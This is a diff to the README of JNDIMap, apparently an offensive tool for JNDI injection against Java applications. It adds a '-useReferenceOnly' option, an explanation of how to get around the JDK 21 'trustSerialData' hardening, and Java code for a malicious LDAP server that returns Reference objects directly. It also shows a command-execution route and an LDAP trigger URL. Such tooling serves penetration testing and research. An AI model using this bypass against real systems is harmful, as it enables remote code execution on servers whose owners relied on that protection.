@@ -17,7 +17,7 @@ Features
 
 ## Build
 
-There are no releases yet, so you need to build it manually (JDK 8)
+There are no releases yet, so you need to build it manually. (JDK 8)
 
 ```bash
 git clone https://github.com/X1r0z/JNDIMap
@@ -42,6 +42,8 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpP
 `-u`: specify the JNDI route manually, e.g. `/Basic/Command/open -a Calculator` (The JNDI URL is not completely controllable in some cases)
 
 `-f`: path to the Groovy script, used to write custom JNDI payloads
+
+`-useReferenceOnly`: only applicable to LDAP protocol, directly returns Reference object through LDAP related parameters, used to bypass `com.sun.jndi.ldap.object.trustSerialData`
 
 `-h`: show usage
 
@@ -418,6 +420,44 @@ Then trigger via any JNDI URL
 
 ```bash
 ldap://127.0.0.1:1389/x
+```
+
+### useReferenceOnly
+
+For JNDI injection of the LDAP protocol, if you want to use ObjectFactory to bypass it, the existing methods are to set the javaSerializedData attribute returned by the LDAP protocol to the serialized data of the Reference object
+
+However, since JDK 21, the `com.sun.jndi.ldap.object.trustSerialData` parameter defaults to false, which means that deserialization cannot be triggered through the LDAP protocol, and the Reference object cannot be parsed through the above method
+
+But we can still set the relevant LDAP parameters so that the server directly returns the Reference object. Because this process does not involve deserialization, it bypasses the restrictions of the trustSerialData parameter
+
+The specific implementation is as follows
+
+```java
+public void processSearchResult(InMemoryInterceptedSearchResult searchResult) {
+    // ......
+
+    Reference ref = (Reference) result;
+    e.addAttribute("objectClass", "javaNamingReference");
+    e.addAttribute("javaClassName", ref.getClassName());
+    e.addAttribute("javaFactory", ref.getFactoryClassName());
+
+    Enumeration<RefAddr> enumeration = ref.getAll();
+    int posn = 0;
+
+    while (enumeration.hasMoreElements()) {
+        StringRefAddr addr = (StringRefAddr) enumeration.nextElement();
+        e.addAttribute("javaReferenceAddress", "#" + posn + "#" + addr.getType() + "#" + addr.getContent());
+        posn ++;
+    }
+
+    // ......
+}
+```
+
+Just specify the `-useReferenceOnly` parameter when using it
+
+```bash
+java -jar JNDIMap.jar -useReferenceOnly
 ```
 
 ## Reference
